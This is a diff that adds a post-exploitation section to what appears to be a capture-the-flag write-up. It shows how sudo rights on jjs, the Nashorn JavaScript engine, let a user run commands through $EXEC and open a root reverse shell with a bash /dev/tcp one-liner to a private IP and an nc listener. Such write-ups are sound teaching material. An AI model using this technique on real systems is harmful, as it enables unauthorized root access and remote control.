@@ -169,3 +169,49 @@ print(plaintext)
 Now, we have a captain and user.txt.
 
 ## Post exploitation
+
+Time to do privilege escalation!
+
+### sudo -l
+![sudo l](screenshots/sudo_l.png)
+I didn't know about jjs before...
+
+### jjs
+
+jjs - The Nashorn JavaScript script engine. Next, i understood that i can execute some sort of things on JavaScript.
+Main thing here is that you can write a script on JS use shebang and execute it in jjs with `jjs script.js`. I started to search how to get a shell from it and i found next solution:
+
+#### GLOBAL OBJECTS!!!
+With shell scripting features enabled, Nashorn defines several global objects.
+This global function `$EXEC` launches processes to run commands.
+```
+$EXEC(your_command_here)
+```
+
+#### Test.js:
+```
+#!/usr/bin/jjs
+
+print($EXEC("whoami"))
+```
+![test script](screenshots/test_script.png)
+Yeah, it works.
+
+#### shell.js:
+Start local server on port 4444:
+```
+nc -lnvp 4444
+```
+Reverse shell from target to our local server on port 4444:
+```
+bash -i >& /dev/tcp/192.168.88.225/4444 0>&1
+```
+Final script:
+```
+#!/usr/bin/jjs
+
+$EXEC("bash -c 'bash -i >& /dev/tcp/192.168.88.225/4444 0>&1'")
+```
+![root](screenshots/root.png)
+Now, we also have a root.txt.
+
